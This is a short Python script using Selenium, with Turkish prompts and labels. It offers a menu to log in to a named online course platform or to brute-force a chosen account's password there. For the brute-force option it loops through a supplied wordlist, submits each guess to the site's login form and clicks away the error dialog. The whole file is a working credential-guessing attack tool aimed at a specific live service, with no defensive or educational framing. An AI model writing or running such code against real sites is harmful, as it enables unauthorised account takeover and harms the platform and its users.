def login(x1,x2):
	browser = webdriver.Firefox()
	browser.get(url)
	time.sleep(2)
	usr_username  = browser.find_element_by_xpath('//*[@id="username"]')
	usr_passwd    = browser.find_element_by_xpath('//*[@id="password"]')
	usr_giris     = browser.find_element_by_xpath('/html/body/div/div/div[1]/div/div[1]/form/div[3]/div[2]/button')

	usr_username.send_keys(x1)
	usr_passwd.send_keys(x2)
	usr_giris.click()

def brute_force(x1,w1):
	say = 1
	browser = webdriver.Firefox()
	browser.get(url)
	time.sleep(2)
	usr_username  = browser.find_element_by_xpath('//*[@id="username"]')
	usr_passwd    = browser.find_element_by_xpath('//*[@id="password"]')
	usr_giris     = browser.find_element_by_xpath('/html/body/div/div/div[1]/div/div[1]/form/div[3]/div[2]/button')
	
	while True:
		with open(w1,"r",encoding="UTF-8") as file:
			for word in file:
				print("""
Deneme : {}
Şifre  : {}
					""".format(say,word))

				usr_username.clear()
				usr_passwd.clear()		
					
				usr_username.send_keys(x1)
				usr_passwd.send_keys(word)

				usr_giris.click()
				time.sleep(0.5)
				hata = browser.find_element_by_xpath('/html/body/div[2]/div/div[1]/div/div/div[3]/button')
				hata.click()
				say += 1

###################################
import time                       #
							      #
from selenium import webdriver    #
###################################
url = "https://finalkurs.perculus.com/login"
def logo1():
        print("""
    *************************
    | coded by root@ebby:~# |
    *************************
    |    Seçenekler         |
    *************************
    |    1. Login           |
    *************************
    |    2. Brute Force     |
    *************************
    |    3. Çıkış           |
    ************************* 
        """)


lil = int(
	input("Seçenek : ")
	)

if lil == 1:
	username = input("E-Posta | Kullanıcı Adı : ")
	password = input("Şifre : ")
	login(username,password)


elif lil == 2:
	username = input("E-Posta | Kullanıcı Adı : ")
	wlist    = input("Wordlist Path : ")
	brute_force(username,wlist)

else:
	print("Geçerli bir seçenek giriniz !!!")

